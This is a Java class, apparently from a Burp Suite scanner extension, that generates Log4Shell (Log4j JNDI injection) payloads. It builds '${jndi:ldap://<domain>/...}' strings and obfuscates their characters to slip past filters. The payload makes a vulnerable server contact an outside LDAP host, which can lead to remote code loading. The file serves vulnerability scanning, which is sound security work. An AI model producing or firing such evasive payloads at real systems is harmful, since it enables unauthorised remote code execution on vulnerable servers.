package burp.poc.impl;

import burp.poc.IPOC;
import burp.utils.Utils;

import static burp.utils.Utils.confusionChars;

public class POC2 implements IPOC {
    
    @Override
    public String generate(String domain) {
        return "${" + Utils.confusionChars(Utils.splitString(String.format("jndi:ldap://%s/%s", domain, Utils.GetRandomString(Utils.GetRandomNumber(2, 5))))) + "}";
    }


    @Override
    public int getType() {
        return POC_TYPE_LDAP;
    }
}